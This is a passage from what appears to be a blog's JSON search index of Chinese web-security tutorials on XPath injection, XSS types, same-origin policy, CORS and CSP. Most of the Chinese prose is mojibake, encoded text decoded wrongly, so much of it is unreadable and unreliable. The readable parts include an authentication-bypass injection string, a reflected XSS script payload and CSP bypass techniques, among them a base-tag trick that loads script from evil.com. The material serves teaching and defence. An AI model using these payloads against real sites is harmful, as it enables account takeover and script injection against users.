ä½†æ˜¯ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„æ–¹æ³•å®æ–½æ³¨å…¥æ”»å‡»ï¼Œç»•è¿‡èº«ä»½éªŒè¯ã€‚å¦‚æœç”¨ æˆ·ä¼ å…¥ä¸€ä¸ª login å’Œ passwordï¼Œä¾‹å¦‚ loginID = &#39;xyz&#39; å’Œ password = &#39;123test&#39; ï¼Œåˆ™è¯¥æŸ¥è¯¢è¯­å¥å°†è¿”å› trueã€‚ä½†å¦‚æœç”¨æˆ·ä¼ å…¥ç±»ä¼¼ &#39; or 1=1 or &#39;&#39;=&#39; çš„å€¼ï¼Œé‚£ä¹ˆè¯¥æŸ¥è¯¢è¯­å¥ä¹Ÿä¼šå¾—åˆ° true è¿”å›å€¼ï¼Œå› ä¸º XPath æŸ¥è¯¢è¯­å¥æœ€ç»ˆä¼šå˜æˆå¦‚ä¸‹ä»£ç ï¼š//users/user[loginID/text()=&#39;&#39;or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39;] è¿™ä¸ªå­—ç¬¦ä¸²ä¼šåœ¨é€»è¾‘ä¸Šä½¿æŸ¥è¯¢ä¸€ç›´è¿”å› true å¹¶å°†ä¸€ç›´å…è®¸æ”»å‡»è€…è®¿é—®ç³»ç»Ÿã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XPath åœ¨åº”ç”¨ç¨‹åºä¸­åŠ¨æ€åœ°æ“ä½œ XML æ–‡æ¡£ã€‚æ”»å‡»å®Œæˆç™»å½•å¯ä»¥å†é€šè¿‡XPathç›²å…¥æŠ€æœ¯è·å–æœ€é«˜æƒé™å¸å·å’Œå…¶å®ƒé‡è¦æ–‡æ¡£ä¿¡æ¯ã€‚","categories":[],"tags":[]},{"title":"xss","slug":"xss","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:44:37.443Z","comments":true,"path":"2023/12/26/xss/","link":"","permalink":"http://example.com/2023/12/26/xss/","excerpt":"xss [TOC]","text":"xss [TOC] xssåˆ†ç±»1.åå°„å‹XSS1234567åå°„å‹XSSæ˜¯æ¯”è¾ƒå¸¸è§å’Œå¹¿æ³›çš„ä¸€ç±»ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œå½“ä¸€ä¸ªç½‘ç«™çš„ä»£ç ä¸­åŒ…å«ç±»ä¼¼ä¸‹é¢çš„è¯­å¥ï¼š&lt;?php echo &quot;&lt;p&gt;hello, $_GET[&#x27;user&#x27;]&lt;/p&gt;&quot;;?&gt; ï¼Œé‚£ä¹ˆåœ¨è®¿é—®æ—¶è®¾ç½® /?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt; ï¼Œ åˆ™å¯æ‰§è¡Œé¢„è®¾å¥½çš„JavaScriptä»£ç ã€‚åå°„å‹XSSé€šå¸¸å‡ºç°åœ¨æœç´¢ç­‰åŠŸèƒ½ä¸­ï¼Œéœ€è¦è¢«æ”»å‡»è€…ç‚¹å‡»å¯¹åº”çš„é“¾æ¥æ‰èƒ½è§¦å‘ï¼Œä¸”å—åˆ°XSS Auditorã€NoScriptç­‰é˜²å¾¡æ‰‹æ®µçš„å½±å“è¾ƒå¤§ã€‚ 2.å‚¨å­˜å‹xss1å‚¨å­˜å‹XSSç›¸æ¯”åå°„å‹æ¥è¯´å±å®³è¾ƒå¤§ï¼Œåœ¨è¿™ç§æ¼æ´ä¸­ï¼Œæ”»å‡»è€…èƒ½å¤ŸæŠŠæ”»å‡»è½½è·å­˜å…¥æœåŠ¡å™¨çš„æ•°æ®åº“ä¸­ï¼Œé€ æˆæŒä¹…åŒ–çš„æ”»å‡»ã€‚ 3.dom xss123456789101112131415161718192021DOMå‹XSSä¸åŒä¹‹å¤„åœ¨äºDOMå‹XSSä¸€èˆ¬å’ŒæœåŠ¡å™¨çš„è§£æå“åº”æ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œè€Œæ˜¯åœ¨JavaScriptè„šæœ¬åŠ¨æ€æ‰§è¡Œçš„è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ã€‚ä¾‹å¦‚ï¼š&lt;html&gt;&lt;head&gt;&lt;title&gt;DOM Based XSS Demo&lt;/title&gt;&lt;script&gt;function xsstest()&#123; var str = document.getElementById(&quot;input&quot;).value; document.getElementById(&quot;output&quot;).innerHTML = &quot;&lt;img src=&#x27;&quot;+str+&quot;&#x27;&gt;&lt;/img&gt;&quot;;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;output&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;input&quot; size=50 value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;submit&quot; onclick=&quot;xsstest()&quot; /&gt;&lt;/body&gt;&lt;/html&gt; 4.Blind XSSBlind XSSæ˜¯å‚¨å­˜å‹XSSçš„ä¸€ç§ï¼Œå®ƒä¿å­˜åœ¨æŸäº›å­˜å‚¨ä¸­ï¼Œå½“ä¸€ä¸ªâ€œå—å®³è€…â€è®¿é—®è¿™ä¸ªé¡µé¢æ—¶æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨æ–‡æ¡£å¯¹è±¡æ¨¡å‹(DOM)ä¸­å‘ˆç°payloadã€‚ å®ƒè¢«ç§°ä¸ºBlindçš„åŸå› æ˜¯å› ä¸ºå®ƒé€šå¸¸å‘ç”Ÿåœ¨é€šå¸¸ä¸æš´éœ²ç»™ç”¨æˆ·çš„åŠŸèƒ½ä¸Šã€‚ xssä½œç”¨å­˜åœ¨XSSæ¼æ´æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š ç”¨æˆ·çš„Cookieè¢«è·å–ï¼Œå…¶ä¸­å¯èƒ½å­˜åœ¨Session IDç­‰æ•æ„Ÿä¿¡æ¯ã€‚è‹¥æœåŠ¡å™¨ç«¯æ²¡æœ‰åšç›¸åº”é˜²æŠ¤ï¼Œæ”»å‡»è€…å¯ç”¨å¯¹åº”Cookieç™»é™†æœåŠ¡å™¨ã€‚ æ”»å‡»è€…èƒ½å¤Ÿåœ¨ä¸€å®šé™åº¦å†…è®°å½•ç”¨æˆ·çš„é”®ç›˜è¾“å…¥ã€‚ æ”»å‡»è€…é€šè¿‡CSRFç­‰æ–¹å¼ä»¥ç”¨æˆ·èº«ä»½æ‰§è¡Œå±é™©æ“ä½œã€‚ XSSè •è™«ã€‚ è·å–ç”¨æˆ·æµè§ˆå™¨ä¿¡æ¯ã€‚ åˆ©ç”¨XSSæ¼æ´æ‰«æç”¨æˆ·å†…ç½‘ã€‚ åŒæºç­–ç•¥ç®€ä»‹åŒæºç­–ç•¥é™åˆ¶äº†ä¸åŒæºä¹‹é—´å¦‚ä½•è¿›è¡Œèµ„æºäº¤äº’ï¼Œæ˜¯ç”¨äºéš”ç¦»æ½œåœ¨æ¶æ„æ–‡ä»¶çš„é‡è¦å®‰å…¨æœºåˆ¶ã€‚ æ˜¯å¦åŒæºç”±URLå†³å®šï¼ŒURLç”±åè®®ã€åŸŸåã€ç«¯å£å’Œè·¯å¾„ç»„æˆï¼Œå¦‚æœä¸¤ä¸ªURLçš„åè®®ã€åŸŸåå’Œç«¯å£ç›¸åŒï¼Œåˆ™è¡¨ç¤ºä»–ä»¬åŒæºã€‚ fileåŸŸçš„åŒæºç­–ç•¥åœ¨ä¹‹å‰çš„æµè§ˆå™¨ä¸­ï¼Œä»»æ„ä¸¤ä¸ªfileåŸŸçš„URIè¢«è®¤ä¸ºæ˜¯åŒæºçš„ã€‚æœ¬åœ°ç£ç›˜ä¸Šçš„ä»»ä½•HTMLæ–‡ä»¶éƒ½å¯ä»¥è¯»å–æœ¬åœ°ç£ç›˜ä¸Šçš„ä»»ä½•å…¶ä»–æ–‡ä»¶ã€‚ ä»Gecko 1.9å¼€å§‹ï¼Œæ–‡ä»¶ä½¿ç”¨äº†æ›´ç»†è‡´çš„åŒæºç­–ç•¥ï¼Œåªæœ‰å½“æºæ–‡ä»¶çš„çˆ¶ç›®å½•æ˜¯ç›®æ ‡æ–‡ä»¶çš„ç¥–å…ˆç›®å½•æ—¶ï¼Œæ–‡ä»¶æ‰èƒ½è¯»å–å¦ä¸€ä¸ªæ–‡ä»¶ã€‚ cookieçš„åŒæºç­–ç•¥cookieä½¿ç”¨ä¸åŒçš„æºå®šä¹‰æ–¹å¼ï¼Œä¸€ä¸ªé¡µé¢å¯ä»¥ä¸ºæœ¬åŸŸå’Œä»»ä½•çˆ¶åŸŸè®¾ç½®cookieï¼Œåªè¦æ˜¯çˆ¶åŸŸä¸æ˜¯å…¬å…±åç¼€(public suffix)å³å¯ã€‚ ä¸ç®¡ä½¿ç”¨å“ªä¸ªåè®®(HTTP&#x2F;HTTPS)æˆ–ç«¯å£å·ï¼Œæµè§ˆå™¨éƒ½å…è®¸ç»™å®šçš„åŸŸä»¥åŠå…¶ä»»ä½•å­åŸŸåè®¿é—®cookieã€‚è®¾ç½® cookieæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ domain &#x2F; path &#x2F; secure å’Œ http-only æ ‡è®°æ¥é™å®šå…¶è®¿é—®æ€§ã€‚ æ‰€ä»¥ https://localhost:8080/ å’Œ http://localhost:8081/ çš„Cookieæ˜¯å…±äº«çš„ã€‚ Flash&#x2F;SilverLightè·¨åŸŸæµè§ˆå™¨çš„å„ç§æ’ä»¶ä¹Ÿå­˜åœ¨è·¨åŸŸéœ€æ±‚ã€‚é€šå¸¸æ˜¯é€šè¿‡åœ¨æœåŠ¡å™¨é…ç½®crossdomain.xmlï¼Œè®¾ç½®æœ¬æœåŠ¡å…è®¸å“ªäº›åŸŸåçš„è·¨åŸŸè®¿é—®ã€‚ å®¢æˆ·ç«¯ä¼šè¯·æ±‚æ­¤æ–‡ä»¶ï¼Œå¦‚æœå‘ç°è‡ªå·±çš„åŸŸååœ¨è®¿é—®åˆ—è¡¨é‡Œï¼Œå°±å‘èµ·çœŸæ­£çš„è¯·æ±‚ï¼Œå¦åˆ™ä¸å‘é€è¯·æ±‚ã€‚ æºçš„æ›´æ”¹åŒæºç­–ç•¥è®¤ä¸ºåŸŸå’Œå­åŸŸå±äºä¸åŒçš„åŸŸï¼Œä¾‹å¦‚ child1.a.com ä¸ a.com &#x2F; child1.a.com ä¸ child2.a.com &#x2F; xxx.child1.a.com ä¸ child1.a.com ä¸¤ä¸¤ä¸åŒæºã€‚ å¯¹äºè¿™ç§æƒ…å†µï¼Œå¯ä»¥åœ¨ä¸¤ä¸ªæ–¹é¢å„è‡ªè®¾ç½® document.domain=&#39;a.com&#39; æ¥æ”¹å˜å…¶æºæ¥å®ç°ä»¥ä¸Šä»»æ„ä¸¤ä¸ªé¡µé¢ä¹‹é—´çš„é€šä¿¡ã€‚ å¦å¤–å› ä¸ºæµè§ˆå™¨å•ç‹¬ä¿å­˜ç«¯å£å·ï¼Œè¿™ç§èµ‹å€¼ä¼šå¯¼è‡´ç«¯å£å·è¢«é‡å†™ä¸º null ã€‚ è·¨æºè®¿é—®åŒæºç­–ç•¥æ§åˆ¶äº†ä¸åŒæºä¹‹é—´çš„äº¤äº’ï¼Œè¿™äº›äº¤äº’é€šå¸¸åˆ†ä¸ºä¸‰ç±»ï¼š é€šå¸¸å…è®¸è·¨åŸŸå†™æ“ä½œ(Cross-origin writes) é“¾æ¥(links)é‡å®šå‘è¡¨å•æäº¤ é€šå¸¸å…è®¸è·¨åŸŸèµ„æºåµŒå…¥(Cross-origin embedding) é€šå¸¸ä¸å…è®¸è·¨åŸŸè¯»æ“ä½œ(Cross-origin reads) å¯èƒ½åµŒå…¥è·¨æºçš„èµ„æºçš„ä¸€äº›ç¤ºä¾‹æœ‰ï¼š &lt;script src=&quot;...&quot;&gt;&lt;/script&gt; æ ‡ç­¾åµŒå…¥è·¨åŸŸè„šæœ¬ã€‚è¯­æ³•é”™è¯¯ä¿¡æ¯åªèƒ½åœ¨åŒæºè„šæœ¬ä¸­æ•æ‰åˆ°ã€‚ &lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt; æ ‡ç­¾åµŒå…¥CSSã€‚ç”±äºCSSçš„æ¾æ•£çš„è¯­æ³•è§„åˆ™ï¼ŒCSSçš„è·¨åŸŸéœ€è¦ä¸€ä¸ªè®¾ç½®æ­£ç¡®çš„Content-Type æ¶ˆæ¯å¤´ã€‚ &lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt; åµŒå…¥å¤šåª’ä½“èµ„æºã€‚ &lt;object&gt; &lt;embed&gt; å’Œ &lt;applet&gt; çš„æ’ä»¶ã€‚ @font-face å¼•å…¥çš„å­—ä½“ã€‚ä¸€äº›æµè§ˆå™¨å…è®¸è·¨åŸŸå­—ä½“( cross-origin fonts)ï¼Œä¸€äº›éœ€è¦åŒæºå­—ä½“(same-origin fonts)ã€‚ &lt;frame&gt; å’Œ &lt;iframe&gt; è½½å…¥çš„ä»»ä½•èµ„æºã€‚ç«™ç‚¹å¯ä»¥ä½¿ç”¨X-Frame-Optionsæ¶ˆæ¯å¤´æ¥é˜»æ­¢è¿™ç§å½¢å¼çš„è·¨åŸŸäº¤äº’ã€‚ JSONPè·¨åŸŸJSONPå°±æ˜¯åˆ©ç”¨ &lt;script&gt; æ ‡ç­¾çš„è·¨åŸŸèƒ½åŠ›å®ç°è·¨åŸŸæ•°æ®çš„è®¿é—®ï¼Œè¯·æ±‚åŠ¨æ€ç”Ÿæˆçš„JavaScriptè„šæœ¬åŒæ—¶å¸¦ä¸€ä¸ªcallbackå‡½æ•°åä½œä¸ºå‚æ•°ã€‚ æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚åï¼ŒåŠ¨æ€ç”Ÿæˆè„šæœ¬äº§ç”Ÿæ•°æ®ï¼Œå¹¶åœ¨ä»£ç ä¸­ä»¥äº§ç”Ÿçš„æ•°æ®ä¸ºå‚æ•°è°ƒç”¨callbackå‡½æ•°ã€‚ JSONPä¹Ÿå­˜åœ¨ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œä¾‹å¦‚å½“å¯¹ä¼ å…¥&#x2F;ä¼ å›å‚æ•°æ²¡æœ‰åšæ ¡éªŒå°±ç›´æ¥æ‰§è¡Œè¿”å›çš„æ—¶å€™ï¼Œä¼šé€ æˆXSSé—®é¢˜ã€‚æ²¡æœ‰åšRefereræˆ–Tokenæ ¡éªŒå°±ç»™å‡ºæ•°æ®çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šé€ æˆæ•°æ®æ³„éœ²ã€‚ å¦å¤–JSONPåœ¨æ²¡æœ‰è®¾ç½®callbackå‡½æ•°çš„ç™½åå•æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆæ³•çš„åšä¸€äº›è®¾è®¡ä¹‹å¤–çš„å‡½æ•°è°ƒç”¨ï¼Œå¼•å…¥é—®é¢˜ã€‚è¿™ç§æ”»å‡»ä¹Ÿè¢«ç§°ä¸ºSOMEæ”»å‡»ã€‚ è·¨æºè„šæœ¬APIè®¿é—®Javascriptçš„APIsä¸­ï¼Œå¦‚ iframe.contentWindow , window.parent, window.open å’Œ window.opener å…è®¸æ–‡æ¡£é—´ç›¸äº’å¼•ç”¨ã€‚å½“ä¸¤ä¸ªæ–‡æ¡£çš„æºä¸åŒæ—¶ï¼Œè¿™äº›å¼•ç”¨æ–¹å¼å°†å¯¹ window å’Œ location å¯¹è±¡çš„è®¿é—®æ·»åŠ é™åˆ¶ã€‚ window å…è®¸è·¨æºè®¿é—®çš„æ–¹æ³•æœ‰ window.blur window.close window.focus window.postMessage window å…è®¸è·¨æºè®¿é—®çš„å±æ€§æœ‰ window.closed window.frames window.length window.location window.opener window.parent window.self window.top window.window å…¶ä¸­ window.location å…è®¸è¯»&#x2F;å†™ï¼Œå…¶ä»–çš„å±æ€§åªå…è®¸è¯» è·¨æºæ•°æ®å­˜å‚¨è®¿é—®å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­çš„æ•°æ®ï¼Œå¦‚ localStorage å’Œ IndexedDBï¼Œä»¥æºè¿›è¡Œåˆ†å‰²ã€‚æ¯ä¸ªæºéƒ½æ‹¥æœ‰è‡ªå·±å•ç‹¬çš„å­˜å‚¨ç©ºé—´ï¼Œä¸€ä¸ªæºä¸­çš„Javascriptè„šæœ¬ä¸èƒ½å¯¹å±äºå…¶å®ƒæºçš„æ•°æ®è¿›è¡Œè¯»å†™æ“ä½œã€‚ CORSCORSæ˜¯ä¸€ä¸ªW3Cæ ‡å‡†ï¼Œå…¨ç§°æ˜¯è·¨åŸŸèµ„æºå…±äº«(Cross-origin resource sharing)ã€‚é€šè¿‡è¿™ä¸ªæ ‡å‡†ï¼Œå¯ä»¥å…è®¸æµè§ˆå™¨è¯»å–è·¨åŸŸçš„èµ„æºã€‚ å¸¸è§è¯·æ±‚å¤´ Origin é¢„æ£€è¯·æ±‚æˆ–å®é™…è¯·æ±‚çš„æºç«™URI, æµè§ˆå™¨è¯·æ±‚é»˜è®¤ä¼šå‘é€è¯¥å­—æ®µOrigin: &lt;origin&gt; Access-Control-Request-Method å£°æ˜è¯·æ±‚ä½¿ç”¨çš„æ–¹æ³•Access-Control-Request-Method: &lt;method&gt; Access-Control-Request-Headers å£°æ˜è¯·æ±‚ä½¿ç”¨çš„headerå­—æ®µAccess-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* å¸¸è§è¿”å›å¤´ Access-Control-Allow-Origin å£°æ˜å…è®¸è®¿é—®çš„æºå¤–åŸŸURIå¯¹äºæºå¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ä¸å¯ä½¿ç”¨é€šé…ç¬¦ *``Access-Control-Allow-Origin: &lt;origin&gt; | * Access-Control-Expose-Headers å£°æ˜å…è®¸æš´éœ²çš„å¤´e.g. Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header Access-Control-Max-Age å£°æ˜Cacheæ—¶é—´Access-Control-Max-Age: &lt;delta-seconds&gt; Access-Control-Allow-Credentials å£°æ˜æ˜¯å¦å…è®¸åœ¨è¯·æ±‚ä¸­å¸¦å…¥Access-Control-Allow-Credentials: true Access-Control-Allow-Methods å£°æ˜å…è®¸çš„è®¿é—®æ–¹å¼Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]* Access-Control-Allow-Headers å£°æ˜å…è®¸çš„å¤´Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* é˜»æ­¢è·¨æºè®¿é—®é˜»æ­¢è·¨åŸŸå†™æ“ä½œï¼Œå¯ä»¥æ£€æµ‹è¯·æ±‚ä¸­çš„ CSRF token ï¼Œè¿™ä¸ªæ ‡è®°è¢«ç§°ä¸ºCross-Site Request Forgery (CSRF) æ ‡è®°ã€‚ é˜»æ­¢èµ„æºçš„è·¨ç«™è¯»å–ï¼Œå› ä¸ºåµŒå…¥èµ„æºé€šå¸¸ä¼šæš´éœ²ä¿¡æ¯ï¼Œéœ€è¦ä¿è¯èµ„æºæ˜¯ä¸å¯åµŒå…¥çš„ã€‚ä½†æ˜¯å¤šæ•°æƒ…å†µä¸‹æµè§ˆå™¨éƒ½ä¸ä¼šéµå®ˆ Content-Type æ¶ˆæ¯å¤´ã€‚ä¾‹å¦‚å¦‚æœåœ¨HTMLæ–‡æ¡£ä¸­æŒ‡å®š &lt;script&gt; æ ‡è®°ï¼Œåˆ™æµè§ˆå™¨ä¼šå°è¯•å°†HTMLè§£æä¸ºJavaScriptã€‚ cspContent Security Policyï¼Œç®€ç§° CSPï¼Œè¯‘ä½œå†…å®¹å®‰å…¨ç­–ç•¥ã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªè§„èŒƒä¸å†…å®¹å®‰å…¨æœ‰å…³ï¼Œä¸»è¦æ˜¯ç”¨æ¥å®šä¹‰å“ªäº›èµ„æºå¯ä»¥è¢«å½“å‰é¡µé¢åŠ è½½ï¼Œå‡å°‘ XSS çš„å‘ç”Ÿã€‚ é…ç½®CSPç­–ç•¥å¯ä»¥é€šè¿‡ HTTP å¤´ä¿¡æ¯æˆ–è€… meta å…ƒç´ å®šä¹‰ã€‚ CSP æœ‰ä¸‰ç±»ï¼š Content-Security-Policy (Google Chrome) X-Content-Security-Policy (Firefox) X-WebKit-CSP (WebKit-based browsers, e.g. Safari) 123HTTP header :&quot;Content-Security-Policy:&quot; ç­–ç•¥&quot;Content-Security-Policy-Report-Only:&quot; ç­–ç•¥ HTTP Content-Security-Policy å¤´å¯ä»¥æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªèµ„æºæ˜¯å®‰å…¨çš„ï¼Œè€ŒContent-Security-Policy-Report-Onlyåˆ™æ˜¯å…è®¸æœåŠ¡å™¨æ£€æŸ¥ï¼ˆéå¼ºåˆ¶ï¼‰ä¸€ä¸ªç­–ç•¥ã€‚å¤šä¸ªå¤´çš„ç­–ç•¥å®šä¹‰ç”±ä¼˜å…ˆé‡‡ç”¨æœ€å…ˆå®šä¹‰çš„ã€‚ HTML Meta : 12&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;ç­–ç•¥&quot;&gt;&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;ç­–ç•¥&quot;&gt; æŒ‡ä»¤è¯´æ˜ æŒ‡ä»¤ è¯´æ˜ default-src å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥ connect-src å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥ font-src å®šä¹‰ Font åŠ è½½ç­–ç•¥ frame-src å®šä¹‰ Frame åŠ è½½ç­–ç•¥ img-src å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥ media-src å®šä¹‰ ã€ ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥ object-src å®šä¹‰ ã€ã€ ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥ script-src å®šä¹‰ JS åŠ è½½ç­–ç•¥ style-src å®šä¹‰ CSS åŠ è½½ç­–ç•¥ base-uri å®šä¹‰ æ ¹URLç­–ç•¥ï¼Œä¸ä½¿ç”¨default-srcä½œä¸ºé»˜è®¤å€¼ sandbox å€¼ä¸º allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox report-uri å€¼ä¸º &#x2F;report-uriï¼Œæäº¤æ—¥å¿— 4.2.4.2.2. å…³é”®å­— - å…è®¸ä»ä»»æ„urlåŠ è½½ï¼Œé™¤äº† data: blob: filesystem: schemese.g. img-src - none ç¦æ­¢ä»ä»»ä½•urlåŠ è½½èµ„æºe.g. object-src &#39;none&#39; self åªå¯ä»¥åŠ è½½åŒæºèµ„æºe.g. img-src &#39;self&#39; data: å¯ä»¥é€šè¿‡dataåè®®åŠ è½½èµ„æºe.g. img-src &#39;self&#39; data: domain.example.com e.g. img-src domain.example.comåªå¯ä»¥ä»ç‰¹å®šçš„åŸŸåŠ è½½èµ„æº \\*.example.com e.g. img-src \\*.example.comå¯ä»¥ä»ä»»æ„example.comçš„å­åŸŸå¤„åŠ è½½èµ„æº https://cdn.com e.g. img-src https://cdn.comåªèƒ½ä»ç»™å®šçš„åŸŸç”¨httpsåŠ è½½èµ„æº https: e.g. img-src https:åªèƒ½ä»ä»»æ„åŸŸç”¨httpsåŠ è½½èµ„æº unsafe-inline å…è®¸å†…éƒ¨èµ„æºæ‰§è¡Œä»£ç ä¾‹å¦‚style attribute,onclickæˆ–è€…æ˜¯sicriptæ ‡ç­¾e.g. script-src &#39;unsafe-inline&#39; unsafe-eval å…è®¸ä¸€äº›ä¸å®‰å…¨çš„ä»£ç æ‰§è¡Œæ–¹å¼ï¼Œä¾‹å¦‚jsçš„eval()e.g. script-src &#39;unsafe-eval&#39; nonce-&lt;base64-value&gt;&#39; ä½¿ç”¨éšæœºçš„nonceï¼Œå…è®¸åŠ è½½æ ‡ç­¾ä¸Šnonceå±æ€§åŒ¹é…çš„æ ‡ç­¾e.g. script-src &#39;nonce-bm9uY2U=&#39; &lt;hash-algo&gt;-&lt;base64-value&gt;&#39; å…è®¸hashå€¼åŒ¹é…çš„ä»£ç å—è¢«æ‰§è¡Œe.g. script-src &#39;sha256-&lt;base64-value&gt;&#39; 4.2.4.2.3. é…ç½®èŒƒä¾‹å…è®¸æ‰§è¡Œå†…è” JS ä»£ç ï¼Œä½†ä¸å…è®¸åŠ è½½å¤–éƒ¨èµ„æº 12Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; Bypassé¢„åŠ è½½æµè§ˆå™¨ä¸ºäº†å¢å¼ºç”¨æˆ·ä½“éªŒï¼Œè®©æµè§ˆå™¨æ›´æœ‰æ•ˆç‡ï¼Œå°±æœ‰ä¸€ä¸ªé¢„åŠ è½½çš„åŠŸèƒ½ï¼Œå¤§ä½“æ˜¯åˆ©ç”¨æµè§ˆå™¨ç©ºé—²æ—¶é—´å»åŠ è½½æŒ‡å®šçš„å†…å®¹ï¼Œç„¶åç¼“å­˜èµ·æ¥ã€‚è¿™ä¸ªæŠ€æœ¯åˆç»†åˆ†ä¸ºDNS-prefetchã€subresourceã€prefetchã€preconnectã€prerenderã€‚ HTML5é¡µé¢é¢„åŠ è½½æ˜¯ç”¨linkæ ‡ç­¾çš„relå±æ€§æ¥æŒ‡å®šçš„ã€‚å¦‚æœcspå¤´æœ‰unsafe-inlineï¼Œåˆ™ç”¨é¢„åŠ è½½çš„æ–¹å¼å¯ä»¥å‘å¤–ç•Œå‘å‡ºè¯·æ±‚ï¼Œä¾‹å¦‚ 123456789&lt;!-- é¢„åŠ è½½æŸä¸ªé¡µé¢ --&gt;&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;&lt;!-- é¢„åŠ è½½æŸä¸ªå›¾ç‰‡ --&gt;&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;&lt;!-- DNS é¢„è§£æ --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;&lt;!-- ç‰¹å®šæ–‡ä»¶ç±»å‹é¢„åŠ è½½ --&gt;&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt; å¦å¤–ï¼Œä¸æ˜¯æ‰€æœ‰çš„é¡µé¢éƒ½èƒ½å¤Ÿè¢«é¢„åŠ è½½ï¼Œå½“èµ„æºç±»å‹å¦‚ä¸‹æ—¶ï¼Œå°†é˜»æ­¢é¢„åŠ è½½æ“ä½œï¼š URLä¸­åŒ…å«ä¸‹è½½èµ„æº é¡µé¢ä¸­åŒ…å«éŸ³é¢‘ã€è§†é¢‘ POSTã€PUTå’ŒDELETæ“ä½œçš„ajaxè¯·æ±‚ HTTPè®¤è¯ HTTPSé¡µé¢ å«æ¶æ„è½¯ä»¶çš„é¡µé¢ å¼¹çª—é¡µé¢ å ç”¨èµ„æºå¾ˆå¤šçš„é¡µé¢ æ‰“å¼€äº†chrome developer toolså¼€å‘å·¥å…· MIME sniffä¸¾ä¾‹æ¥è¯´ï¼Œcspç¦æ­¢è·¨ç«™è¯»å–è„šæœ¬ï¼Œä½†æ˜¯å¯ä»¥è·¨ç«™è¯»imgï¼Œé‚£ä¹ˆä¼ ä¸€ä¸ªå«æœ‰è„šæœ¬çš„imgï¼Œå†&lt;script href=&#39;http://xxx.com/xx.jpg&#39;&gt;ï¼Œè¿™é‡Œcspè®¤ä¸ºæ˜¯ä¸€ä¸ªimgï¼Œç»•è¿‡äº†æ£€æŸ¥ï¼Œå¦‚æœç½‘ç«™æ²¡æœ‰å›æ­£ç¡®çš„mime typeï¼Œæµè§ˆå™¨ä¼šè¿›è¡ŒçŒœæµ‹ï¼Œå°±å¯èƒ½åŠ è½½è¯¥imgä½œä¸ºè„šæœ¬ 302è·³è½¬å¯¹äº302è·³è½¬ç»•è¿‡CSPè€Œè¨€ï¼Œå®é™…ä¸Šæœ‰ä»¥ä¸‹å‡ ç‚¹é™åˆ¶ï¼š è·³æ¿å¿…é¡»åœ¨å…è®¸çš„åŸŸå†…ã€‚ è¦åŠ è½½çš„æ–‡ä»¶çš„hostéƒ¨åˆ†å¿…é¡»è·Ÿå…è®¸çš„åŸŸçš„hostéƒ¨åˆ†ä¸€è‡´ iframeå½“å¯ä»¥æ‰§è¡Œä»£ç æ—¶ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæºä¸º css js ç­‰é™æ€æ–‡ä»¶çš„frameï¼Œåœ¨é…ç½®ä¸å½“æ—¶ï¼Œè¯¥frameå¹¶ä¸å­˜åœ¨cspï¼Œåˆ™åœ¨è¯¥frameä¸‹å†æ¬¡åˆ›å»ºframeï¼Œè¾¾åˆ°bypassçš„ç›®çš„ã€‚åŒç†ï¼Œä½¿ç”¨ ../../../ /%2e%2e%2f ç­‰å¯èƒ½è§¦å‘æœåŠ¡å™¨æŠ¥é”™çš„é“¾æ¥ä¹Ÿå¯ä»¥åˆ°è¾¾ç›¸åº”çš„ç›®çš„ã€‚ base-uriå½“script-srcä¸ºnonceæˆ–æ— é™åˆ¶ï¼Œä¸”base-uriæ— é™åˆ¶æ—¶ï¼Œå¯é€šè¿‡ base æ ‡ç­¾ä¿®æ”¹æ ¹URLæ¥bypassï¼Œå¦‚ä¸‹åŠ è½½äº†http://evil.com/main.js 12&lt;base href=&quot;http://evil.com/&quot;&gt;&lt;script nonce=&quot;correct value&quot; 